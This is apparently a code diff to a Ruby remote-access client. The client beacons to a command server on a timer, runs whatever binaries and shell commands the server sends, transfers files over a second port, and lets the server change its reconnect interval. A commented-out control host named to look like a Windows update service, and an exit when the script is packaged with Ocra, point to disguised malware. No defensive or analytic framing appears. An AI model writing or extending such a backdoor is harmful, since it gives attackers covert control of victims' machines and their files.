@@ -2,10 +2,12 @@ require 'socket'
 require 'timeout'
 require 'Open3'
 
-SIZE = 1024 * 1024 * 10
-PORT = 443
+CONPORT = 12078
+DATAPORT = 29629
 HOST = 'localhost'
-PERIOD = 5
+#HOST = "winclientupdate.sytes.net"
+$connect_period = 7000
+
 
 def cli_puts (*string)
   printf('cli$: ')
@@ -24,15 +26,22 @@ def interpret (command)
     retval = exec(command)
   elsif command.byteslice(0, 3) == 'sys'
     retval = syscall(command)
+  elsif command.byteslice(0, 6) == 'period'
+    pcmd = command.split(" ", 2)
+    $connect_period = pcmd[1].to_i
+    retval = "command set to " + $connect_period.to_s + "sec"
   elsif command.byteslice(0, 3) == 'get'
     retval = getfile(command)
   elsif command.byteslice(0, 4) == 'send'
-    retval = command
+    retval = sendfile(command)
   elsif command.byteslice(0, 4) == 'help'
     retval = "cli:$ available commands: \r\n
             exec #file #arguments: executes binary with given arguments\r\n
-            system #command: runs command line command\r\n
+            sys #command: runs command line command\r\n
             Please enter your command:"
+  elsif command.byteslice(0, 4) == 'exit'
+    #Kernel.exit
+    exit! false
   else
     retval = "cli:$ unknown command, please reenter"
   end
@@ -59,6 +68,44 @@ def getfile (command)
 end
 #######################
 #FILE SENDER MODULE END
+#######################
+
+#########################
+#FILE GETTER MODULE BEGIN
+#########################
+# THE SEND COMMAND HERE IS SENT FROM THE COMMANDER THATSWHY IT IS SEND HERE AS WELL
+def sendfile (command)
+
+  fileToWrite = command.split(" ", 3)
+  ftw = fileToWrite[1].split("\\", 2)
+
+  filereceiverclient = TCPSocket.open(HOST, DATAPORT)
+
+  printf "cli$: data connection established with server at %s on port %d, id: %d \n", Time.now.ctime.to_s, DATAPORT, filereceiverclient.__id__
+
+  readable,writable,error = IO.select([filereceiverclient], nil, nil, 10) # blocks until the timeout occurs (3 seconds) or until a becomes readable.
+  p :r => readable, :w => writable, :e => error
+
+  ###################READ_BEGIN######################
+  data = filereceiverclient.read
+  ####################READ_END#######################
+
+  #save read data to a new file
+
+  destFile = File.open(ftw[1].to_s, 'wb')
+  destFile.print data
+  file_size = File.size(destFile)
+  printf " downloaded file size: %f", file_size
+  destFile.close
+
+  filereceiverclient.close
+return "success"
+
+
+
+end
+#######################
+#FILE GETTER MODULE END
 #######################
 
 
@@ -132,15 +179,17 @@ end
 #COMMAND EXECUTION COMMAND MODULE END
 #####################################
 
+exit if Object.const_defined?(:Ocra)
+
 #cli_puts "TCP client is starting up."
 
 loop {
 #loop for attempting connections in every 30 secs
-  sleep(PERIOD)
+  sleep($connect_period)
   begin #rescue block: from server not found error
-    server = TCPSocket.open(HOST, PORT)
+    server = TCPSocket.new(HOST, CONPORT)
 
-    printf("cli$: connected to server at %s on port %d \n", Time.now.ctime.to_s, PORT)
+    printf("cli$: connected to server at %s on port %d \n", Time.now.ctime.to_s, CONPORT)
 
     ###############################
     #COMMAND RECEIVER MODULE BEGINS
@@ -166,26 +215,7 @@ loop {
 
         cli_puts('command received from server: ' + command)
         if command.byteslice(0,4) == 'send'
-          begin
-            printf '1'
-            ftw = command.split(" ", 3)[1].split("\\", 2)[1]
-            printf '2'
-            #data = sock.read
-            data = server.gets()
-            printf '3'
-            destFile = File.open(ftw, 'wb')
-            printf '4'
-            destFile.print data
-            printf '5'
-            destFile.close
-
-            file_size = File.size(destFile) / 1024 / 1024
-            result = 'file received: ' + ftw + 'size: ' + file_size
-            cli_puts(result)
-            server.puts result + "\r\n EOC"
-          rescue IOError
-              #do not leave on closed stream error
-          end
+            #
         end
         command_result = interpret(command)
         server.puts command_result + "\r\n cli$: enter your command EOC"
@@ -207,7 +237,7 @@ loop {
   rescue Exception => e
     #rescue from any error:
     if(e.class.name.start_with?('Errno::ECONNREFUSED'))
-      printf("cli$: could not establish connection to server %s/%d at %s \n", HOST, PORT, Time.now.ctime.to_s)
+      printf("cli$: could not establish connection to server %s/%d at %s \n", HOST, CONPORT, Time.now.ctime.to_s)
     else
       #for Debugging
       cli_puts 'cli:$ error: ' + e.message
